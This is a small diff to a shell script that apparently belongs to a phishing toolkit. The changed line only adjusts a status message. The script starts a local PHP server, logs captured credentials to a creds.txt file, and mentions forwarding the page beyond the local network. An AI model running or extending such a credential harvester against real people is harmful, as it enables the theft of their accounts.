@@ -181,7 +181,7 @@ if [ ! -e $TMP_PATH/creds.txt ]; then
 fi
 
 date >> $TMP_PATH/creds.txt
-printf "$Y\n[!]->$W Server php running on http://127.0.0.1:4546$Y\n[!]->$W To lunch it out of lan run :$G i-Haklab forwarding$Y\n[!]-> Credentials will be save in /$PREFIX/var/service/php/$SITE/creds.txt$B\n[-]->$W Waiting for information (ctrl_c to cancel). . .\n"
+printf "$Y\n[!]->$W Server php running on http://127.0.0.1:4546$Y\n[!]->$W To lunch it out of lan run :$G i-Haklab forwarding$Y\n[!]->$W Credentials will be save in \$PREFIX/var/service/php/$SITE/creds.txt$B\n[-]->$W Waiting for information (ctrl_c to cancel). . .\n"
 while [ true ]; do
 	sleep 10
         
